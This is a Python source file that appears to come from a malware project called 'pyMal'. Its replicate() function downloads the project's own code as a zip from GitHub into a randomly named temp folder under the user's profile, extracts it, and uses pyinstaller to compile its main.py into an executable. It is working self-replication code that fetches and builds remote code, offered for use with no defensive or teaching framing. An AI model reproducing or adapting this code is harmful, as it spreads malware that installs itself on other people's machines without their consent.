import os
from Utils.helpers import random_string, download_file,\
    extract_zip,tempFolder,BaseTempFolder,install_with_pyinstaller,find_python_path






def replicate():
    our_zip = "https://github.com/Cyb3rDud3/pyMal/archive/refs/heads/main.zip"
    path = tempFolder.format(os.getlogin(),random_string(is_random=True,is_zip=True))
    if download_file(path,our_zip):
        if extract_zip(BaseTempFolder.format(os.getlogin()),path):
            pyinstaller_place = find_python_path().replace('python.exe','scripts/pyinstaller.exe')
            if 'program' in pyinstaller_place.lower():
                pyinstaller_place = f"pyinstaller.exe"
            install_with_pyinstaller(pyinstaller_path=pyinstaller_place,
                                     base_dir=os.path.join(BaseTempFolder.format(os.getlogin()),'pyMal-main'),
                                     file_to_install='main.py',
                                     hidden_imports=['psutil','sqlite3','requests'])
            return True
        #install it with pyinstaller?
        # we should do this path ONLY if we compiled the bootloader and didn't succed in the usual ways

    return 0
